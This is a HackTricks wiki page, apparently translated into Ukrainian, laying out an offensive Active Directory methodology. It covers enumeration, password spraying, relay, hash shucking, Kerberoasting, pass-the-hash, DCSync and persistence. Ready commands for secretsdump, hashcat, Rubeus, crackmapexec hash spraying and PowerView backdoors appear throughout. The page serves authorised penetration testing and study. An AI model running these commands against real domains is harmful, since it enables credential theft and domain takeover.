# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** слугує фундаментальною технологією, яка дозволяє **мережним адміністраторам** ефективно створювати та керувати **доменами**, **користувачами** та **об’єктами** у мережі. Вона спроєктована для масштабування, що дозволяє організовувати велику кількість користувачів у керовані **групи** та **підгрупи**, одночасно контролюючи **права доступу** на різних рівнях.

Структура **Active Directory** складається з трьох основних шарів: **домени**, **дерева** та **ліси**. **Домен** охоплює колекцію об’єктів, таких як **користувачі** або **пристрої**, які мають спільну базу даних. **Дерева** — це групи таких доменів, пов’язаних спільною структурою, а **ліс** представляє збірку кількох дерев, взаємопов’язаних через **trust relationships**, утворюючи найвищий рівень організаційної структури. Конкретні **права доступу** та **права на комунікацію** можна призначати на кожному з цих рівнів.

Ключові поняття в **Active Directory** включають:

1. **Directory** – Містить всю інформацію, що стосується об’єктів Active Directory.
2. **Object** – Позначає сутності в каталозі, включаючи **користувачів**, **групи** або **спільні папки**.
3. **Domain** – Служить контейнером для об’єктів каталогу; в одному **лісі** може існувати кілька доменів, кожен з яких має власну колекцію об’єктів.
4. **Tree** – Групування доменів, які ділять спільний кореневий домен.
5. **Forest** – Верхній рівень організаційної структури в Active Directory, що складається з кількох дерев з **trust relationships** між ними.

**Active Directory Domain Services (AD DS)** охоплює набір сервісів, критичних для централізованого управління та комунікації в мережі. Ці сервіси включають:

1. **Domain Services** – Централізує зберігання даних і керує взаємодіями між **користувачами** та **доменами**, включно з **authentication** та функціями **search**.
2. **Certificate Services** – Керує створенням, розповсюдженням та адмініструванням безпечних **digital certificates**.
3. **Lightweight Directory Services** – Підтримує додатки, що використовують каталог, через протокол **LDAP**.
4. **Directory Federation Services** – Забезпечує можливість **single-sign-on** для аутентифікації користувачів у кількох веб-додатках в одній сесії.
5. **Rights Management** – Допомагає захищати авторські матеріали, регулюючи їх несанкціоноване розповсюдження та використання.
6. **DNS Service** – Критично важливий для розв’язання **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Щоб навчитися атакувати **AD**, потрібно дуже добре розуміти процес аутентифікації **Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

- **Pentest the network:**
- Scan the network, find machines and open ports and try to **exploit vulnerabilities** or **extract credentials** from them (for example, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerating DNS could give information about key servers in the domain as web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Take a look to the General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) to find more information about how to do this.
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- A more detailed guide on how to enumerate a SMB server can be found here:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.
- If you find the complete names of company workers, you could try different AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). The most common conventions are: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
- **No Authentication against MS-NRPC**: Using auth-level = 1 (No authentication) against the MS-NRPC (Netlogon) interface on domain controllers. The method calls the `DsrGetDcNameEx2` function after binding MS-NRPC interface to check if the user or computer exists without any credentials. The [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implements this type of enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) сервер**

Якщо ви знайшли один із таких серверів у мережі, ви також можете виконати **user enumeration against it**. Наприклад, ви можете використати інструмент [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Ви можете знайти списки імен користувачів у [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  і в цьому ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Однак ви повинні мати **імена людей, які працюють у компанії** з кроку recon, який ви мали виконати раніше. Маючи ім’я та прізвище, ви можете використати скрипт [**namemash.py**](https://gist.github.com/superkojiman/11076951) для генерації потенційно дійсних username-ів.

### Knowing one or several usernames

Добре, отже ви вже знаєте дійсний username, але не маєте паролів... Тоді спробуйте:

- [**ASREPRoast**](asreproast.md): Якщо користувач **не має** атрибута _DONT_REQ_PREAUTH_ ви можете **запросити AS_REP повідомлення** для цього користувача, яке міститиме дані, зашифровані похідною від пароля користувача.
- [**Password Spraying**](password-spraying.md): Спробуйте найпоширеніші паролі для кожного з виявлених користувачів — можливо хтось використовує слабкий пароль (пам’ятайте про політику паролів!).
- Зауважте, що ви також можете **spray OWA servers**, щоб спробувати отримати доступ до поштових серверів користувачів.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ви можете отримати деякі challenge hashes для розв'язування, виконуючи poisoning деяких протоколів мережі:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Якщо вам вдалося проінвентаризувати Active Directory, ви отримаєте **більше email-адрес і краще розуміння мережі**. Ви можете примусити NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack), щоб отримати доступ до AD середовища.

### Steal NTLM Creds

Якщо ви можете **доступитися до інших ПК або shares** під **null or guest user**, ви могли б **розмістити файли** (наприклад SCF файл), які, якщо їх якось відкриють, спровокують **NTLM authentication до вас**, щоб ви могли **вкрасти** **NTLM challenge** для його злому:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** розглядає кожен NT hash, який у вас уже є, як кандидат-пароль для інших, повільніших форматів, ключовий матеріал яких походить безпосередньо від NT hash. Замість брутфорсу довгих фраз у Kerberos RC4 тікетах, NetNTLM challenge або кешованих облікових даних, ви підсовуєте NT хеші в NT-candidate режими Hashcat і дозволяєте йому перевірити повторне використання пароля, не отримуючи при цьому plaintext. Це особливо ефективно після компрометації домену, коли можна зібрати тисячі поточних і історичних NT hash-ів.

Використовуйте shucking коли:

- У вас є корпус NT з DCSync, SAM/SECURITY дампів або credential vaults і потрібно перевірити повторне використання в інших domains/forests.
- Ви захоплюєте Kerberos матеріал на основі RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM відповіді або DCC/DCC2 бло́би.
- Ви хочете швидко довести повторне використання для довгих, незламних фраз і негайно пройти через Pass-the-Hash.

Техніка **не працює** проти типів шифрування, ключі яких не базуються на NT hash (наприклад, Kerberos etype 17/18 AES). Якщо домен вимагає лише AES, доведеться повертатися до звичайних password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Використовуйте `secretsdump.py` з history, щоб захопити максимально великий набір NT hash-ів (і їх попередні значення):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Записи history значно розширюють пул кандидатів, оскільки Microsoft може зберігати до 24 попередніх хешів на обліковий запис. Для інших способів збору секретів NTDS дивіться:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (або Mimikatz `lsadump::sam /patch`) витягає локальні SAM/SECURITY дані та кешовані доменні логони (DCC/DCC2). Видаліть дублікати та додайте ці хеші в той самий файл `nt_candidates.txt`.
- **Track metadata** – Зберігайте username/domain, які породили кожен хеш (навіть якщо wordlist містить лише hex). Збіг хешів одразу покаже, який прінціпал повторно використовує пароль, щойно Hashcat виведе знайдений кандидат.
- Віддавайте перевагу кандидатам з того самого forest або trusted forest; це максимізує шанси на збіг при shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Примітки:

- NT-candidate inputs **повинні залишатися сирими 32-hex NT hash**. Вимкніть rule engines (без `-r`, без hybrid modes), бо mangling ушкоджує матеріал ключа кандидата.
- Ці режими не є за визначенням швидшими, але keyspace NTLM (~30,000 MH/s на M3 Max) приблизно у 100× швидший за Kerberos RC4 (~300 MH/s). Тестування кураторського списку NT значно дешевше, ніж дослідження всього простору паролів у повільному форматі.
- Завжди запускайте **останній Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`), оскільки режими 31500/31600/35300/35400 з’явилися нещодавно.
- Наразі немає NT режиму для AS-REQ Pre-Auth, і AES etypes (19600/19700) вимагають plaintext пароль, тому що їхні ключі виводяться через PBKDF2 від UTF-16LE паролів, а не від сирих NT hash-ів.

#### Example – Kerberoast RC4 (mode 35300)

1. Захопіть RC4 TGS для цільового SPN з низькопривілейованого користувача (деталі див. на сторінці Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck тікет за допомогою вашого списку NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat виводить RC4 ключ з кожного NT кандидата і перевіряє `$krb5tgs$23$...` блоб. Збіг підтверджує, що сервісний акаунт використовує один із ваших наявних NT хешів.

3. Негайно pivot через PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

За бажанням ви можете пізніше відновити plaintext командою `hashcat -m 1000 <matched_hash> wordlists/`, якщо потрібно.

#### Example – Cached credentials (mode 31600)

1. Здампіть кешовані логіни з скомпрометованої робочої станції:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Скопіюйте рядок DCC2 для цікавого доменного користувача в `dcc2_highpriv.txt` і shuck-ніть його:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Успішний збіг дає NT hash, вже відомий у вашому списку, що підтверджує, що кешований користувач повторно використовує пароль. Використайте його безпосередньо для PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) або перебирайте його у швидкому NTLM режимі, щоб відновити рядок.

Точно така ж схема застосовується до NetNTLM challenge-responses (`-m 27000/27100`) і DCC (`-m 31500`). Після виявлення збігу можна запустити relay, SMB/WMI/WinRM PtH або повторно зламати NT hash офлайн за допомогою масок/правил.



## Enumerating Active Directory WITH credentials/session

Для цієї фази вам потрібно **скомпрометувати credentials або сесію дійсного доменного акаунта.** Якщо у вас є дійсні credentials або shell як доменний користувач, **пам’ятайте, що раніше наведені опції все ще залишаються способами скомпрометувати інших користувачів.**

Перед початком аутентифікованої енумерації ви повинні знати, що таке **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Компрометація акаунта — це **великий крок до компрометації всього домену**, бо ви зможете почати **енумерацію Active Directory:**

Щодо [**ASREPRoast**](asreproast.md) ви тепер можете знайти всіх потенційно вразливих користувачів, а щодо [**Password Spraying**](password-spraying.md) ви можете отримати **список усіх username-ів** і спробувати пароль скомпрометованого акаунта, порожні паролі та нові перспективні паролі.

- Ви можете використати [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Також можна використовувати [**powershell for recon**](../basic-powershell-for-pentesters/index.html), що буде менш помітним
- Ви також можете [**use powerview**](../basic-powershell-for-pentesters/powerview.md) для витягування більш детальної інформації
- Ще один чудовий інструмент для recon в Active Directory — [**BloodHound**](bloodhound.md). Він **не дуже stealthy** (залежно від методів збору), але **якщо вам це не важливо**, варто спробувати. Знаходьте, де користувачі можуть RDP, шукайте маршрути до інших груп тощо.
- **Інші автоматизовані інструменти для AD enumeration:** [**AD Explorer**](bloodhound.md#ad-explorer), [**ADRecon**](bloodhound.md#adrecon), [**Group3r**](bloodhound.md#group3r), [**PingCastle**](bloodhound.md#pingcastle).
- Перевірте [**DNS records of the AD**](ad-dns-records.md), оскільки вони можуть містити цікаву інформацію.
- Інструмент з GUI, який можна використовувати для енумерації каталогу — **AdExplorer.exe** з **SysInternal** Suite.
- Ви також можете шукати в LDAP базі за допомогою **ldapsearch**, щоб знайти credentials у полях _userPassword_ & _unixUserPassword_, або навіть у _Description_. Див. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) для інших методів.
- Якщо ви використовуєте **Linux**, також можна енумерувати домен за допомогою [**pywerview**](https://github.com/the-useless-one/pywerview).
- Ви також можете спробувати автоматизовані інструменти такі як:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Дуже просто отримати всі username-и домену з Windows (`net user /domain`, `Get-DomainUser` або `wmic useraccount get name,sid`). В Linux можна використати: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` або `enum4linux -a -u "user" -p "password" <DC IP>`

> Навіть якщо ця секція Енумерації виглядає короткою, вона є найважливішою. Перейдіть за посиланнями (особливо за cmd, powershell, powerview та BloodHound), навчіться енумерувати домен і практикуйтеся, поки не почуватиметеся впевнено. Під час оцінювання це буде ключовий момент для знаходження шляху до DA або для рішення, що нічого не вдасться зробити.

### Kerberoast

Kerberoasting полягає в отриманні **TGS tickets**, що використовуються сервісами, прив’язаними до користувацьких акаунтів, та розшифровці їх шифру — який базується на паролях користувачів — **офлайн**.

Більше про це в:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Після отримання credentials ви можете перевірити, чи маєте доступ до якоїсь **машини**. Для цього можна використовувати **CrackMapExec**, щоб спробувати підключитися до кількох серверів по різних протоколах відповідно до ваших порт-сканів.

### Local Privilege Escalation

Якщо ви скомпрометували credentials або сесію як звичайний доменний користувач і маєте **доступ** цим користувачем до **будь-якої машини в домені**, спробуйте знайти спосіб **локально підвищити привілеї та зібрати credentials**. Тільки з локальними правами адміністратора ви зможете **дампити хеші інших користувачів** з пам’яті (LSASS) і локально (SAM).

У книзі є окрема сторінка про [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) та [**checklist**](../checklist-windows-privilege-escalation.md). Також не забувайте використовувати [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Дуже **малоймовірно**, що ви знайдете **tickets** у поточного користувача, які б давали вам доступ до несподіваних ресурсів, але ви можете перевірити:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Якщо вам вдалося перелічити Active Directory, у вас буде **більше електронних адрес і краще розуміння мережі**. Можливо, ви зможете примусити NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Тепер, коли у вас є базові облікові дані, слід перевірити, чи можете ви **знайти** якісь **цікаві файли, що розшарюються всередині AD**. Це можна робити вручну, але це дуже нудне повторюване завдання (особливо якщо ви знайдете сотні документів, які потрібно перевірити).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Якщо ви можете **доступитися до інших ПК або шарів**, ви можете **розмістити файли** (наприклад SCF файл), які, якщо ними хтось скористається, will t**rigger an NTLM authentication against you** щоб ви могли **steалити** **NTLM challenge**, щоб його зламати:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця вразливість дозволяла будь-якому автентифікованому користувачу **компрометувати контролер домену**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Для наступних технік звичайного доменного користувача недостатньо — вам потрібні спеціальні привілеї/облікові дані, щоб виконати ці атаки.**

### Hash extraction

Сподіваємось, вам вдалося **компрометувати якийсь локальний admin** акаунт, використовуючи [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) включно з relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [ескалацією привілеїв локально](../windows-local-privilege-escalation/index.html).\
Тоді час дампити всі хеші з пам'яті та локально.\
[**Прочитайте цю сторінку про різні способи отримання хешів.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Коли у вас є хеш користувача**, ви можете використати його, щоб **видавати себе за нього**.\
Потрібно використати якийсь **інструмент**, який **виконає** **NTLM аутентифікацію за допомогою** цього **хеша**, **або** ви можете створити новий **sessionlogon** і **інжектнути** цей **хеш** всередину **LSASS**, так що коли відбудеться будь-яка **NTLM аутентифікація**, буде використано цей **хеш.** Останній варіант — те, що робить mimikatz.\
[**Прочитайте цю сторінку для отримання додаткової інформації.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ця атака має на меті **використати NTLM хеш користувача для запиту Kerberos квитків**, як альтернативу звичній Pass The Hash через NTLM протокол. Тому це може бути особливо **корисним в мережах, де NTLM протокол вимкнено** і дозволений лише **Kerberos** як протокол аутентифікації.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

У методі атаки **Pass The Ticket (PTT)** зловмисники **викрадають автентифікаційний квиток користувача** замість його пароля або хешів. Потім цей викрадений квиток використовується для **видачі себе за користувача**, що дає несанкціонований доступ до ресурсів і сервісів у мережі.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Якщо у вас є **hash** або **password** від **локального administrator'а**, спробуйте **увійти локально** на інші **PCs** з його допомогою.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Зверніть увагу, що це досить **шумно**, і **LAPS** **пом’якшить** це.

### Зловживання MSSQL та довірені посилання

Якщо користувач має привілеї для **access MSSQL instances**, він може використати їх для **execute commands** на хості MSSQL (якщо процес працює від імені SA), **steal** NetNTLM **hash** або навіть виконати **relay** **attack**.\
Також, якщо екземпляр MSSQL є trusted (database link) для іншого екземпляру MSSQL, і користувач має привілеї над trusted database, він зможе **use the trust relationship to execute queries also in the other instance**. Ці довіри можуть ланцюжитися, і в певний момент користувач може знайти некоректно налаштовану базу даних, де зможе виконувати команди.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Зловживання платформами розгортання/обліку ІТ-активів

Сторонні suite для інвентаризації та розгортання часто відкривають потужні шляхи до credentials та виконання коду. Дивіться:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знайдете будь-який Computer object з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і маєте domain привілеї на цьому комп’ютері, ви зможете дампити TGTs з пам’яті кожного користувача, що залогінюється на ньому.\
Отже, якщо **Domain Admin logins onto the computer**, ви зможете дампити його TGT і видаватися ним за допомогою [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation ви навіть могли б **automatically compromise a Print Server** (сподіваюсь, це буде DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо користувач або комп’ютер дозволені для "Constrained Delegation", вони зможуть **impersonate any user to access some services in a computer**.\
Тоді, якщо ви **compromise the hash** цього користувача/комп’ютера, ви зможете **impersonate any user** (навіть domain admins) для доступу до певних сервісів.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Наявність привілею **WRITE** на об’єкті Active Directory віддаленого комп’ютера дозволяє отримати виконання коду з **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Скомпрометований користувач міг мати деякі **interesting privileges over some domain objects**, які дозволять вам пізніше **move** латерално/і **escalate** привілеї.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Виявлення **Spool service listening** у домені може бути **abused** для **acquire new credentials** та **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Якщо **other users** **access** скомпрометовану машину, можливо **gather credentials from memory** і навіть **inject beacons in their processes** для видавання себе за них.\
Зазвичай користувачі підключаються через RDP, тож тут показано декілька атак над сесіями третіх сторін RDP:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** надає систему для керування **локальним Administrator password** на комп’ютерах, приєднаних до домену, забезпечуючи його **рандомізацію**, унікальність та часту **зміну**. Ці паролі зберігаються в Active Directory і доступ до них контролюється через ACLs лише для уповноважених користувачів. Маючи достатні дозволи для доступу до цих паролів, стає можливим pivoting to other computers.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** зі скомпрометованої машини може бути способом ескалації привілеїв у середовищі:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Якщо налаштовані **vulnerable templates**, їх можна зловживати для ескалації привілеїв:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Післяексплуатація з обліковим записом високих привілеїв

### Dumping Domain Credentials

Отримавши **Domain Admin** або ще краще **Enterprise Admin** привілеї, ви можете **dump** **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Деякі з технік, обговорених вище, можуть бути використані для persistence.\
Наприклад, ви могли б:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** створює **легітимний Ticket Granting Service (TGS) ticket** для конкретного сервісу, використовуючи **NTLM hash** (наприклад, **hash of the PC account**). Цей метод застосовується для отримання **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** передбачає, що нападник отримує доступ до **NTLM hash of the krbtgt account** в Active Directory (AD). Цей обліковий запис особливий, оскільки використовується для підпису всіх **Ticket Granting Tickets (TGTs)**, що необхідні для аутентифікації в мережі AD.

Отримавши цей hash, нападник може створювати **TGTs** для будь-якого облікового запису на свій розсуд (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Це схоже на golden tickets, підроблені таким чином, щоб **bypass common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Наявність certificates облікового запису або можливість їх запитувати** — дуже зручний спосіб зберегти persistence в обліковому записі користувача (навіть якщо він змінить пароль):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Використання certificates також дозволяє зберігати persistence з високими привілеями всередині домену:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Об’єкт **AdminSDHolder** в Active Directory забезпечує безпеку **привілейованих груп** (наприклад, Domain Admins та Enterprise Admins), застосовуючи стандартний **Access Control List (ACL)** до цих груп, щоб запобігти несанкціонованим змінам. Однак ця функція може бути використана зловмисником; якщо атакуючий змінить ACL AdminSDHolder, надавши повний доступ звичайному користувачу, цей користувач отримає широкі права над усіма привілейованими групами. Цей захід безпеки, призначений для захисту, може назад зіграти, дозволяючи небажаний доступ, якщо його не моніторити.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

У кожному **Domain Controller (DC)** існує локальний обліковий запис адміністратора. Отримавши admin права на такій машині, хеш локального Administrator можна витягти за допомогою **mimikatz**. Після цього необхідна модифікація реєстру, щоб **enable the use of this password**, що дозволить віддалений доступ до локального Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Ви могли б **надати** деякі **спеціальні дозволи** користувачу над певними domain objects, які дозволять цьому користувачу **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** використовуються для **зберігання** **permissions**, які має **object** над іншим **object**. Якщо ви зможете зробити невелику зміну в **security descriptor** об’єкта, ви можете отримати дуже цікаві привілеї над цим об’єктом без необхідності бути членом привілейованої групи.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Змініть **LSASS** в пам’яті, щоб встановити **universal password**, що надасть доступ до всіх доменних облікових записів.


{{#ref}}
skeleton-key.md
{{#endref}}
